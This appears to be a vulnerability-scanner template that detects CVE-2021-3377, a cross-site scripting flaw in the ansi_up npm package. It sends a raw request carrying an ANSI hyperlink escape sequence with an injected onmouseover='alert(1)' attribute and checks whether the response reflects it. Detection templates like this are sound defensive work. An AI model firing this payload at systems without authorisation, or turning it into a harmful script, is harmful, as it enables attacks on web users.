id: CVE-2021-3377
info:
  author: geeknik
  description: The npm package ansi_up converts ANSI escape codes into HTML. In ansi_up
    v4, ANSI escape codes can be used to create HTML hyperlinks. Due to insufficient
    URL sanitization, this feature is affected by a cross-site scripting (XSS) vulnerability.
    This issue is fixed in v5.0.0.
  name: ansi_up xss
  reference: https://doyensec.com/resources/Doyensec_Advisory_ansi_up4_XSS.pdf
  severity: medium
requests:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - type: word
    words:
    - com"/onmouseover="alert(1)">
  matchers-condition: and
  raw:
  - 'GET /\u001B]8;;https://example.com"/onmouseover="alert(1)\u0007example\u001B]8;;\u0007
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101
    Firefox/71.0

    Connection: close


    '
  redirects: true
  unsafe: true
